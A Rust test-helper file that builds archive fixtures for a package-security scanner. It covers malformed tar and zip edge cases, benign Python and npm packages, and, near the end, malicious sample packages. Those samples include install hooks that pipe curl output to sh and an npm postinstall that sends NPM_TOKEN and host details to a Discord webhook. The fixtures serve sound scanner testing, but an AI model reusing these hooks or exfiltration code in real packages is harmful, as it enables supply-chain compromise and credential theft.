//! In-memory archive builders for tests. Malicious-looking fixtures are inert strings: they
//! are only ever lexed by the scanner, never executed.
#![allow(dead_code)]

use flate2::write::GzEncoder;
use flate2::Compression;
use std::io::{Cursor, Write};
use zip::write::SimpleFileOptions;

pub enum TarItem<'a> {
    File(&'a str, &'a [u8]),
    /// Path written verbatim into the header, bypassing the builder's own path checks.
    RawPath(&'a str, &'a [u8]),
    Symlink(&'a str, &'a str),
    HardLink(&'a str, &'a str),
    /// A GNU sparse member (typeflag `S`) holding `data` as one chunk.
    Sparse(&'a str, &'a [u8]),
}

/// Write `v` as a NUL-terminated octal field.
fn octal(field: &mut [u8], v: u64) {
    let s = format!("{v:0w$o}", w = field.len() - 1);
    field[..s.len()].copy_from_slice(s.as_bytes());
    field[s.len()..].fill(0);
}

fn raw_header(path: &str, size: u64, kind: tar::EntryType) -> tar::Header {
    let mut h = tar::Header::new_gnu();
    {
        let name = &mut h.as_old_mut().name;
        let b = path.as_bytes();
        name[..b.len()].copy_from_slice(b);
    }
    h.set_size(size);
    h.set_mode(0o644);
    h.set_entry_type(kind);
    h
}

pub fn tar_bytes(items: &[TarItem<'_>]) -> Vec<u8> {
    let mut b = tar::Builder::new(Vec::new());
    for item in items {
        match item {
            TarItem::File(p, d) => {
                let mut h = tar::Header::new_gnu();
                h.set_size(d.len() as u64);
                h.set_mode(0o644);
                h.set_entry_type(tar::EntryType::Regular);
                b.append_data(&mut h, p, *d).unwrap();
            }
            TarItem::RawPath(p, d) => {
                let mut h = raw_header(p, d.len() as u64, tar::EntryType::Regular);
                h.set_cksum();
                b.append(&h, *d).unwrap();
            }
            TarItem::Symlink(p, target) | TarItem::HardLink(p, target) => {
                let kind = if matches!(item, TarItem::Symlink(..)) {
                    tar::EntryType::Symlink
                } else {
                    tar::EntryType::Link
                };
                let mut h = raw_header(p, 0, kind);
                let t = target.as_bytes();
                h.as_old_mut().linkname[..t.len()].copy_from_slice(t);
                h.set_cksum();
                b.append(&h, &[][..]).unwrap();
            }
            TarItem::Sparse(p, d) => {
                let mut h = raw_header(p, d.len() as u64, tar::EntryType::GNUSparse);
                let gnu = h.as_gnu_mut().unwrap();
                octal(&mut gnu.sparse[0].offset, 0);
                octal(&mut gnu.sparse[0].numbytes, d.len() as u64);
                octal(&mut gnu.realsize, d.len() as u64);
                h.set_cksum();
                b.append(&h, *d).unwrap();
            }
        }
    }
    b.into_inner().unwrap()
}

/// A tar whose `before` entries are followed by one all-zero block and then the `after`
/// entries (node-tar reads on until two zero blocks in a row; the tar crate stops at one).
pub fn tar_with_zero_block(before: &[TarItem<'_>], after: &[TarItem<'_>]) -> Vec<u8> {
    let mut t = tar_bytes(before);
    t.truncate(t.len() - 1024);
    t.extend([0u8; 512]);
    t.extend(tar_bytes(after));
    t
}

pub fn gz(data: &[u8]) -> Vec<u8> {
    let mut e = GzEncoder::new(Vec::new(), Compression::default());
    e.write_all(data).unwrap();
    e.finish().unwrap()
}

pub fn tar_gz(items: &[TarItem<'_>]) -> Vec<u8> {
    gz(&tar_bytes(items))
}

pub fn tar_gz_files(files: &[(&str, &str)]) -> Vec<u8> {
    let items: Vec<TarItem<'_>> = files
        .iter()
        .map(|(p, d)| TarItem::File(p, d.as_bytes()))
        .collect();
    tar_gz(&items)
}

pub fn zip_files(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let opts = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
    for (p, d) in files {
        w.start_file(*p, opts).unwrap();
        w.write_all(d).unwrap();
    }
    w.finish().unwrap().into_inner()
}

pub fn zip_with_method(files: &[(&str, &[u8])], method: zip::CompressionMethod) -> Vec<u8> {
    let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let opts = SimpleFileOptions::default().compression_method(method);
    for (p, d) in files {
        w.start_file(*p, opts).unwrap();
        w.write_all(d).unwrap();
    }
    w.finish().unwrap().into_inner()
}

/// A stored zip whose entries named in `relabel` claim compression method `method` in
/// both the local and the central directory header, as an archive built by a tool that
/// supports a method the scanner does not.
pub fn zip_claiming_method(files: &[(&str, &[u8])], relabel: &[&str], method: u16) -> Vec<u8> {
    let mut b = zip_with_method(files, zip::CompressionMethod::Stored);
    let patch =
        |b: &mut Vec<u8>, sig: &[u8; 4], len_at: usize, name_at: usize, method_at: usize| {
            let mut i = 0;
            while let Some(off) = b[i..].windows(4).position(|w| w == sig) {
                let at = i + off;
                let n = u16::from_le_bytes([b[at + len_at], b[at + len_at + 1]]) as usize;
                let name = b[at + name_at..at + name_at + n].to_vec();
                if relabel.iter().any(|r| r.as_bytes() == name.as_slice()) {
                    b[at + method_at..at + method_at + 2].copy_from_slice(&method.to_le_bytes());
                }
                i = at + 4;
            }
        };
    // Local header: method at 8, name length at 26, name at 30. Central: 10, 28, 46.
    patch(&mut b, b"PK\x03\x04", 26, 30, 8);
    patch(&mut b, b"PK\x01\x02", 28, 46, 10);
    b
}

pub fn zip_with_symlink(target: &str) -> Vec<u8> {
    zip_with_symlink_named("pkg/link", target)
}

/// A wheel-like zip whose `name` entry carries symlink mode with `target` as its bytes.
pub fn zip_with_symlink_named(name: &str, target: &str) -> Vec<u8> {
    let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let opts = SimpleFileOptions::default();
    w.start_file("pkg/__init__.py", opts).unwrap();
    w.write_all(b"x = 1\n").unwrap();
    w.add_symlink(name, target, opts).unwrap();
    w.finish().unwrap().into_inner()
}

pub const BENIGN_SETUP_PY: &str = r#"from setuptools import setup, find_packages

# Note: subprocess and os.system are mentioned only in this comment.
setup(
    name="demo",
    version="1.0.0",
    description="A tiny demo package",
    url="https://github.com/example/demo",
    author_email="dev@example.org",
    license="MIT",
    packages=find_packages(),
    install_requires=["requests>=2"],
)
"#;

pub const BENIGN_PKG_INFO: &str = "Metadata-Version: 2.1\nName: demo\nVersion: 1.0.0\nSummary: A tiny demo package\nHome-page: https://github.com/example/demo\nAuthor-email: dev@example.org\nLicense: MIT\nRequires-Dist: requests>=2\n\nDemo long description.\n";

pub const BENIGN_INIT: &str =
    "\"\"\"Demo package.\"\"\"\n\nfrom .core import add\n\n__all__ = [\"add\"]\n";

pub const BENIGN_CORE: &str =
    "def add(a, b):\n    \"\"\"Add two numbers.\"\"\"\n    return a + b\n";

pub fn benign_sdist() -> Vec<u8> {
    tar_gz_files(&[
        ("demo-1.0.0/PKG-INFO", BENIGN_PKG_INFO),
        ("demo-1.0.0/setup.py", BENIGN_SETUP_PY),
        ("demo-1.0.0/README.md", "# demo\n\nAdds numbers.\n"),
        ("demo-1.0.0/demo/__init__.py", BENIGN_INIT),
        ("demo-1.0.0/demo/core.py", BENIGN_CORE),
        (
            "demo-1.0.0/tests/test_core.py",
            "from demo import add\n\ndef test_add():\n    assert add(1, 2) == 3\n",
        ),
    ])
}

pub fn benign_wheel() -> Vec<u8> {
    zip_files(&[
        ("demo/__init__.py", BENIGN_INIT.as_bytes()),
        ("demo/core.py", BENIGN_CORE.as_bytes()),
        ("demo-1.0.0.dist-info/METADATA", BENIGN_PKG_INFO.as_bytes()),
        (
            "demo-1.0.0.dist-info/WHEEL",
            b"Wheel-Version: 1.0\nGenerator: test\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
        ),
        ("demo-1.0.0.dist-info/RECORD", b""),
    ])
}

pub const BENIGN_PACKAGE_JSON: &str = r#"{
  "name": "tiny-demo",
  "version": "1.2.3",
  "description": "Pads strings",
  "main": "lib/index.js",
  "homepage": "https://github.com/example/tiny-demo",
  "repository": { "type": "git", "url": "git+https://github.com/example/tiny-demo.git" },
  "author": "Dev <dev@example.org>",
  "license": "MIT",
  "keywords": ["pad", "string"],
  "scripts": { "test": "node test.js" },
  "dependencies": {}
}
"#;

pub fn benign_npm() -> Vec<u8> {
    tar_gz_files(&[
        ("package/package.json", BENIGN_PACKAGE_JSON),
        ("package/README.md", "# tiny-demo\n"),
        (
            "package/lib/index.js",
            "'use strict';\n// fetch(url) is not called here\nmodule.exports = function pad(s, n) {\n  return String(s).padStart(n);\n};\n",
        ),
        ("package/test.js", "const pad = require('./lib');\nconsole.log(pad('a', 3));\n"),
    ])
}

/// setup.py that decodes and runs a payload at install time.
pub const MALICIOUS_SETUP_PY: &str = r#"import base64, os
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)
        payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="
        exec(base64.b64decode(payload))
        os.system("curl -s http://203.0.113.20/x.sh | sh")

setup(name="evil-demo", version="0.0.1", cmdclass={"install": PostInstall})
"#;

pub fn malicious_sdist() -> Vec<u8> {
    tar_gz_files(&[
        (
            "evil-demo-0.0.1/PKG-INFO",
            "Metadata-Version: 2.1\nName: evil-demo\nVersion: 0.0.1\nSummary: \n",
        ),
        ("evil-demo-0.0.1/setup.py", MALICIOUS_SETUP_PY),
        ("evil-demo-0.0.1/evil_demo/__init__.py", ""),
    ])
}

pub const MALICIOUS_PACKAGE_JSON: &str = r#"{
  "name": "evil-npm-demo",
  "version": "99.0.0",
  "description": "",
  "scripts": {
    "preinstall": "curl -s https://example.invalid/a.sh | sh",
    "postinstall": "node scripts/install.js"
  }
}
"#;

pub const MALICIOUS_INSTALL_JS: &str = r#"const send = require('./helper');
const os = require('os');
send({ host: os.hostname(), user: os.userInfo().username });
"#;

pub const MALICIOUS_HELPER_JS: &str = r#"const https = require('https');
module.exports = function send(data) {
  const body = JSON.stringify({ content: JSON.stringify(data), token: process.env.NPM_TOKEN });
  const req = https.request('https://discord.com/api/webhooks/123/abc', { method: 'POST' });
  req.end(body);
};
"#;

pub fn malicious_npm() -> Vec<u8> {
    tar_gz_files(&[
        ("package/package.json", MALICIOUS_PACKAGE_JSON),
        ("package/index.js", "module.exports = {};\n"),
        ("package/scripts/install.js", MALICIOUS_INSTALL_JS),
        ("package/scripts/helper.js", MALICIOUS_HELPER_JS),
    ])
}
